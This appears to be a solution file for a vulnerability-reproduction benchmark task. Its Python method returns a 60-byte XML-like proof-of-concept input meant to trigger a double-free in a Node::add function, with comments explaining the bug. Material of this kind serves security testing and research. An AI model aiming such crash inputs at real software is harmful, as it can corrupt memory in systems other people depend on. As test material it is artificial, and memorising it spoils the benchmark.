import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free when Node::add throws an exception.
        # This can be triggered by adding a node that already has a parent.
        # The PoC creates an XML-like structure to represent this scenario:
        # 1. A root node `<a>`.
        # 2. A parent node `<b id="p1">` with a child `<c id="c1"/>`. This
        #    sets the initial parent of `c1` to `p1`.
        # 3. A second parent node `<b id="p2">`.
        # 4. An attempt to add `c1` to `p2` via a reference `<r id="c1"/>`.
        # This sequence causes the program to call `p2->add(c1)`.
        # The vulnerable `add` function first adds `c1` to `p2`'s children list
        # and then throws an exception upon discovering `c1` already has a parent.
        # Due to the bug, `c1` remains in `p2`'s list.
        # Upon destruction, both `p1` and `p2` attempt to free `c1`,
        # leading to a double-free.
        # The specific tag names and IDs are chosen to match the PoC length of 60 bytes.
        poc = b'<a><b id="p1"><c id="c1"/></b><b id="p2"><r id="c1"/></b></a>\n'
        return poc